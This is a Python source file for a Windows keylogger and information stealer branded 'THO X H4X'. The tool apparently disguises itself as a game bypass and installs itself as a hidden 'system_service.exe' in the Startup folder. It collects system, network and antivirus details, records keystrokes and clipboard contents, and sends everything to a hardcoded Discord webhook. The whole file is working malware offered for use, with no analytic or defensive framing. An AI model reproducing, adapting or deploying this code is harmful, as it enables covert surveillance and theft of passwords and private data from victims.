import os
import sys
import subprocess
import json
import shutil  
import base64
import time
import threading
import requests
from pynput import keyboard
import win32com.client
import psutil
import wmi
import platform
import socket
import ctypes
import uuid
import importlib.metadata

WEBHOOK_URL = "https://discord.com/api/webhooks/1369180172200444034/4NTznpTg03R6i5mArGoRbBAzNUv81HqzBOy7eLHJJ7d6DeegNqyzS2wEY4P7FI46Ehdn"
EMBED_THUMBNAIL = "https://media1.tenor.com/m/Cgtv0ZxW3rUAAAAC/h4x.gif" # FOTO DE PERFIL
EMBED_GIF = "https://media1.tenor.com/m/Cgtv0ZxW3rUAAAAC/h4x.gif" # FOTO DE ABAJO GIF
DEVICE_ID_FILE = os.path.join(os.getenv('TEMP'), '.device_id')
SENT_DATA = set()
keystrokes = []

SENSITIVE_KEYWORDS = {
    'ip', 'mac', 'address', 'dns', 'gateway', 
    '192.168', '10.0', '172.16', '169.254',
    'fe80', '::1', '127.0.0.1', 'localhost',
    '-', ':', '.'  
}

def install_dependencies():
    dependencies = [
        'requests',
        'pynput',
        'psutil',
        'pywin32',
        'wmi'
    ]
    
    for dep in dependencies:
        try:
            importlib.import_module(dep)
        except ImportError:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", "-q", dep],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except:
                return False
    return True

def show_console():
    if os.name == 'nt':
        try:
        
            kernel32 = ctypes.WinDLL('kernel32')
            if kernel32.GetConsoleWindow():
                return
            
            kernel32.AllocConsole()
            kernel32.SetConsoleCP(65001)
            kernel32.SetConsoleOutputCP(65001)
            
            if hasattr(sys, 'frozen'):
                sys.stdout = open('CONOUT$', 'w', encoding='utf-8', buffering=1)
                sys.stderr = open('CONOUT$', 'w', encoding='utf-8', buffering=1)
        except:
            pass

def show_banner():
    try:
        banner = """
████████╗██╗  ██╗ ██████╗      ██╗  ██╗    ██╗  ██╗██╗  ██╗██╗  ██╗
╚══██╔══╝██║  ██║██╔═══██╗     ╚██╗██╔╝    ██║  ██║██║  ██║╚██╗██╔╝
   ██║   ███████║██║   ██║      ╚███╔╝     ███████║███████║ ╚███╔╝ 
   ██║   ██╔══██║██║   ██║      ██╔██╗     ██╔══██║╚════██║ ██╔██╗ 
   ██║   ██║  ██║╚██████╔╝     ██╔╝ ██╗    ██║  ██║     ██║██╔╝ ██╗
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝      ╚═╝  ╚═╝    ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═╝
                                                                  
═══════════════════════════════════════════════════════
║            [Advanced System Integration]             ║
║                Created by: THO X H4X                 ║
╚══════════════════════════════════════════════════════╝"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
    except:
        print("\n=== Advanced System Integration ===\n")

def get_gpu_info():

    try:
        w = wmi.WMI()
        gpus = []
        for gpu in w.Win32_VideoController():
            gpu_info = f"{gpu.Name} ({gpu.AdapterRAM/(1024*1024):.0f}MB)" if gpu.AdapterRAM else gpu.Name
            gpus.append(gpu_info)
        return gpus if gpus else ["No se detectaron GPUs"]
    except:
        return ["Error obteniendo información de GPU"]

def get_security_info():

    security_info = {
        "antivirus": [],
        "firewall": "No detectado",
        "servicios": []
    }
    
    try:
        w = wmi.WMI()
        
        antivirus_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        if os.path.exists(r"C:\ProgramData\Microsoft\Windows Defender"):
            security_info["antivirus"].append("Windows Defender")
        
        security_services = {
            "WinDefend": "Windows Defender",
            "MsMpSvc": "Microsoft Antimalware",
            "McAfeeFramework": "McAfee",
            "avast! Antivirus": "Avast",
            "AVG Antivirus": "AVG",
            "Norton": "Norton",
            "Kaspersky": "Kaspersky",
            "Avira": "Avira"
        }
        
        for service in w.Win32_Service():
            if service.State == 'Running':
                for key, name in security_services.items():
                    if key.lower() in service.Name.lower():
                        if name not in security_info["antivirus"]:
                            security_info["antivirus"].append(name)
                if "firewall" in service.Name.lower():
                    security_info["servicios"].append(service.Name)

        try:
            firewall = subprocess.run(
                ["netsh", "advfirewall", "show", "currentprofile"], 
                capture_output=True, 
                text=True
            )
            if "State                                 ON" in firewall.stdout:
                security_info["firewall"] = "Windows Firewall (Activado)"
            else:
                security_info["firewall"] = "Windows Firewall (Desactivado)"
        except:
            pass
            
        return security_info
    except Exception as e:
        print(f"Error obteniendo información de seguridad: {e}")
        return security_info

def collect_system_info():

    try:
        w = wmi.WMI()
        processes = sorted([p.Name for p in w.Win32_Process()], key=str.lower)[:50]
        security_info = get_security_info()
        
        return {
            "💻 Sistema": {
                "Sistema Operativo": f"{platform.system()} {platform.release()}",
                "Versión": platform.version(),
                "Arquitectura": platform.machine(),
                "Hostname": socket.gethostname(),
                "Usuario": os.getenv('USERNAME'),
                "Dominio": os.getenv('USERDOMAIN'),
                "Fecha y Hora": time.strftime("%Y-%m-%d %H:%M:%S"),
                "Zona Horaria": time.strftime("%Z"),
                "Python Version": platform.python_version()
            },
            "🔧 Hardware": {
                "Procesador": platform.processor(),
                "CPU Cores": f"Físicos: {psutil.cpu_count(logical=False)} | Lógicos: {psutil.cpu_count()}",
                "Uso CPU": f"{psutil.cpu_percent()}%",
                "Memoria RAM": {
                    "Total": f"{round(psutil.virtual_memory().total/1024**3, 2)} GB",
                    "Disponible": f"{round(psutil.virtual_memory().available/1024**3, 2)} GB",
                    "En Uso": f"{psutil.virtual_memory().percent}%"
                },
                "Almacenamiento": [
                    {
                        "Unidad": disk.device,
                        "Total": f"{round(psutil.disk_usage(disk.mountpoint).total/1024**3)} GB",
                        "Libre": f"{round(psutil.disk_usage(disk.mountpoint).free/1024**3)} GB",
                        "En Uso": f"{psutil.disk_usage(disk.mountpoint).percent}%"
                    } for disk in psutil.disk_partitions() if disk.fstype
                ],
                "GPU": get_gpu_info()
            },
            "🌐 Red": {
                "IP Local": socket.gethostbyname(socket.gethostname()),
                "IP Externa": requests.get('https://api.ipify.org').text,
                "Interfaces": [
                    {
                        "Nombre": iface,
                        "Direcciones": [addr.address for addr in addrs if hasattr(addr, 'address')]
                    } for iface, addrs in psutil.net_if_addrs().items()
                ],
                "Estadísticas": {
                    "Enviado": f"{round(psutil.net_io_counters().bytes_sent/1024**2, 2)} MB",
                    "Recibido": f"{round(psutil.net_io_counters().bytes_recv/1024**2, 2)} MB"
                }
            },
            "🛡️ Seguridad": {
                "Antivirus": security_info["antivirus"] or ["No detectado"],
                "Firewall": security_info["firewall"],
                "UAC Activo": ctypes.windll.shell32.IsUserAnAdmin() == 0,
                "Servicios de Seguridad": security_info["servicios"] or ["No detectados"]
            }
        }
    except Exception as e:
        return {"Error": str(e)}

def setup_autorun():

    try:
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
            
        target_path = os.path.join(startup_path, 'system_service.exe')

        if os.path.exists(target_path):
            try:
         
                with open(target_path, 'a+b') as f:
                
                    if f.seekable():
        
                        if os.path.getsize(target_path) != os.path.getsize(sys.executable):
                            shutil.copy2(sys.executable, target_path)
            except:
                return False
        else:
  
            shutil.copy2(sys.executable, target_path)
            
        subprocess.run(
            ['attrib', '+h', target_path],
            capture_output=True
        )
        return True
    except:
        return False

def get_device_id():

    try:
        if os.path.exists(DEVICE_ID_FILE):
            with open(DEVICE_ID_FILE, 'r') as f:
                return f.read().strip()
        
        mac = uuid.getnode()  
        cpu_id = platform.processor()
        hostname = platform.node()
        
        unique_id = f"{hostname}-{mac}-{hash(cpu_id)}"
        device_id = base64.urlsafe_b64encode(unique_id.encode()).decode()[:32]
        
        with open(DEVICE_ID_FILE, 'w') as f:
            f.write(device_id)
        return device_id
    except:
        return f"UnknownDevice-{int(time.time())}"

def clean_format(content):

    if isinstance(content, dict):
        cleaned = {}
        for k, v in content.items():
            if isinstance(v, dict):
                cleaned[k] = clean_format(v)
            elif isinstance(v, list):
                cleaned[k] = [clean_format(item) if isinstance(item, dict) else str(item) for item in v]
            else:
                cleaned[k] = str(v)
        return cleaned
    return str(content).strip()

def format_message(data):

    if isinstance(data, dict):
        message = []
        for key, value in data.items():
            if isinstance(value, dict):
                sub_items = [f"• {k}: {v}" for k, v in value.items()]
                message.append(f"**{key}**\n" + "\n".join(sub_items))
            elif isinstance(value, list):
                items = [f"• {item}" for item in value]
                message.append(f"**{key}**\n" + "\n".join(items))
            else:
                message.append(f"**{key}**: {value}")
        return "\n\n".join(message)
    return str(data)

def format_network_info(interfaces):

    formatted = []
    for iface in interfaces:

        name = iface['Nombre']  
        addresses = iface['Direcciones']
        
        info = [f"📡 Nombre: {name}"]  
        if addresses:
            info.append("Direcciones:")
            for addr in addresses:
            
                info.append(f"• ||{addr}||")
        
        formatted.append("\n".join(info))
    
    stats = {
        "Enviado": f"||{round(psutil.net_io_counters().bytes_sent/1024**2, 2)} MB||",
        "Recibido": f"||{round(psutil.net_io_counters().bytes_recv/1024**2, 2)} MB||"
    }
    
    network_info = "\n\n".join(formatted)
    network_info += "\n\nEstadísticas\n"
    network_info += f"Enviado: {stats['Enviado']}\n"
    network_info += f"Recibido: {stats['Recibido']}"
    
    return network_info

def format_data(data, indent=0):
 
    if isinstance(data, dict):
        lines = []
        for key, value in data.items():
            key_lower = key.lower()
            if isinstance(value, dict):
                lines.append(f"**{key}**")
                lines.append(format_data(value, indent + 1))
            elif isinstance(value, list):
                lines.append(f"**{key}**")
                for item in value:
                    if isinstance(item, dict):
                        lines.append("  " * indent + format_data(item, indent + 1))
                    else:
                 
                        if any(keyword in str(item).lower() for keyword in SENSITIVE_KEYWORDS) or \
                           (isinstance(item, str) and ('.' in item or ':' in item)):
                            lines.append("  " * indent + f"• ||{item}||")
                        else:
                            lines.append("  " * indent + f"• {item}")
            else:
                value_str = str(value)
          
                if any(keyword in value_str.lower() for keyword in SENSITIVE_KEYWORDS) or \
                   ('.' in value_str and any(c.isdigit() for c in value_str)):
                    lines.append(f"**{key}**: ||{value_str}||")
                else:
                    lines.append(f"**{key}**: {value_str}")
        return "\n".join(lines)
    return str(data)

def verify_dependencies():

    required = {
        'requests': 'Conexión',
        'pynput': 'Control',
        'psutil': 'Sistema',
        'win32com': 'Windows API',
        'wmi': 'WMI',
        'cryptography': 'Seguridad'
    }
    
    missing = []
    for module, desc in required.items():
        try:
            __import__(module)
        except ImportError:
            missing.append(f"{module} ({desc})")
    
    if missing:
        print("Dependencias faltantes:")
        for mod in missing:
            print(f"- {mod}")
        return False
    return True

def create_singleton():
 
    try:
    
        mutex_name = "Global\\THO_X_H4X_SINGLETON_V4"
        mutex = ctypes.windll.kernel32.CreateMutexW(None, True, mutex_name)
        last_error = ctypes.get_last_error()
        
        if mutex == 0:
            return None
            
        if last_error == 183:  
            ctypes.windll.kernel32.CloseHandle(mutex)
            return None
            
        pid_file = os.path.join(os.getenv('TEMP'), '.thox_instance.pid')
        if os.path.exists(pid_file):
            try:
                with open(pid_file, 'r') as f:
                    old_pid = int(f.read().strip())
                    if psutil.pid_exists(old_pid):
                        proc = psutil.Process(old_pid)
                        if proc.name().lower() in ['gamebypass.exe', 'system_service.exe']:
                            return None
            except:
                pass
                
        try:
            with open(pid_file, 'w') as f:
                f.write(str(os.getpid()))
        except:
            pass
            
        return mutex
    except:
        return None

def setup_autorun():
 
    try:
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
            
        target_path = os.path.join(startup_path, 'system_service.exe')
        
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                if proc.info['name'].lower() == 'system_service.exe':
                    if proc.info['exe'] and os.path.exists(proc.info['exe']):
                        if os.path.samefile(proc.info['exe'], target_path):
                            return True
            except:
                continue
        
        try:
            if os.path.exists(target_path):
                if os.path.getsize(target_path) == os.path.getsize(sys.executable):
                    return True
                    
            shutil.copy2(sys.executable, target_path)
            subprocess.run(['attrib', '+h', target_path], capture_output=True)
            return True
            
        except PermissionError:
            return False
            
    except Exception as e:
        print(f"Error en setup_autorun: {e}")
        return False

def send_to_discord(content, title="", force=False):

    try:

        content_hash = hash(str(content))
        if not force and content_hash in SENT_DATA:
            return True
        
        SENT_DATA.add(content_hash)
        
        cleaned_content = clean_format(content)
        formatted_message = format_data(cleaned_content)
        
        embed = {
            "title": title or "💻 Sistema",
            "description": formatted_message,
            "color": 0x2F3136,
            "thumbnail": {"url": EMBED_THUMBNAIL},
            "image": {"url": EMBED_GIF},
            "footer": {
                "text": f"THO X H4X | {time.strftime('%Y-%m-%d %H:%M:%S')}",
                "icon_url": EMBED_THUMBNAIL
            }
        }

        payload = {
            "username": "THO X H4X",
            "avatar_url": EMBED_THUMBNAIL,
            "embeds": [embed]
        }

        return requests.post(WEBHOOK_URL, json=payload).status_code == 204

    except Exception as e:
        print(f"Error enviando datos: {e}")
        return False

def open_discord():

    import webbrowser
    invite_link = "https://discord.gg/tfRuSC52Da"
    try:
        webbrowser.open_new(invite_link)
    except:
        try:
            os.system(f'cmd /c start {invite_link}')
        except:
            pass

def send_initial_data():

    try:
        import pythoncom
        pythoncom.CoInitialize()
        
        system_info = collect_system_info()
        if system_info:

            for category, data in system_info.items():
                if isinstance(data, dict):
                    send_to_discord(data, category)
                    time.sleep(0.5)  
        
        pythoncom.CoUninitialize()
        return True
    except Exception as e:
        print(f"Error enviando datos: {e}")
        return False

def on_press(key):

    global keystrokes
    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            try:
                import win32clipboard
                win32clipboard.OpenClipboard()
                copied_text = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                
                text_hash = hash(copied_text)
                if text_hash not in SENT_DATA:
                    SENT_DATA.add(text_hash)
                    send_to_discord(f"📋 Copiado: ||{copied_text}||", "Clipboard")
            except:
                pass
            return

        if key == keyboard.Key.enter:
            text = ''.join(keystrokes).strip()
            if text:
   
                text_hash = hash(text)
                if text_hash not in SENT_DATA:
                    SENT_DATA.add(text_hash)
                    send_to_discord(f"⌨️ Texto: ||{text}||", "Entrada de Teclado")
            keystrokes.clear()
        elif key == keyboard.Key.space:
            keystrokes.append(' ')
        elif key == keyboard.Key.backspace and keystrokes:
            keystrokes.pop()
        elif hasattr(key, 'char'):
            keystrokes.append(key.char)
    except:
        pass

def create_singleton_mutex():

    try:
        mutex_name = "Global\\THO_X_H4X_SINGLETON_V3"
        mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, 1, mutex_name)
        
        if not mutex_handle:
            return None
            
        if ctypes.get_last_error() == 183:  
            ctypes.windll.kernel32.CloseHandle(mutex_handle)
            return None
            
        current_exe = os.path.basename(sys.executable).lower()
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                if proc.info['pid'] != os.getpid():
                    if proc.info['name'].lower() == current_exe:
                        return None
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
        return mutex_handle
    except:
        return None

def verify_single_instance():
 
    try:
        pid_file = os.path.join(os.getenv('TEMP'), '.thox_instance.pid')
        
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    if psutil.pid_exists(old_pid):
           
                        proc = psutil.Process(old_pid)
                        if proc.name().lower() in ['gamebypass.exe', 'system_service.exe']:
                            return False
                except:
                    pass
                    
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
        return True
    except:
        return True

def cleanup():

    try:
   
        current_pid = os.getpid()
        current_name = os.path.basename(sys.executable).lower()
        
        for proc in psutil.process_iter(['pid', 'name']):
            try:
        
                if proc.info['pid'] != current_pid:
             
                    if proc.info['name'].lower() in ['gamebypass.exe', 'system_service.exe']:
                        proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
        temp_files = ['.device_id', '.thox_instance.pid']
        temp_dir = os.getenv('TEMP')
        
        for file in temp_files:
            try:
                path = os.path.join(temp_dir, file)
                if os.path.exists(path):
                    os.remove(path)
            except:
                pass
                
    except Exception as e:
        print(f"Error en cleanup: {e}")

def main():

    if not verify_dependencies():
        print("Error: Dependencias faltantes")
        time.sleep(3)
        return
         
    mutex = create_singleton()
    if not mutex:
        sys.exit(0)
    
    try:
        show_console()
        show_banner()
        
        setup_autorun()
        
        print("\n✅ Sistema iniciado correctamente\n")
        
        send_initial_data()
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

        try:
            while True:
                time.sleep(1)
                if not ctypes.windll.kernel32.WaitForSingleObject(mutex, 0) == 0:
                    break
        except:
            pass
        finally:
            listener.stop()
            cleanup()
            if mutex:
                ctypes.windll.kernel32.CloseHandle(mutex)
            
    except Exception as e:
        print(f"Error: {e}")
        if mutex:
            ctypes.windll.kernel32.CloseHandle(mutex)
        cleanup()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error crítico: {e}")
        time.sleep(3)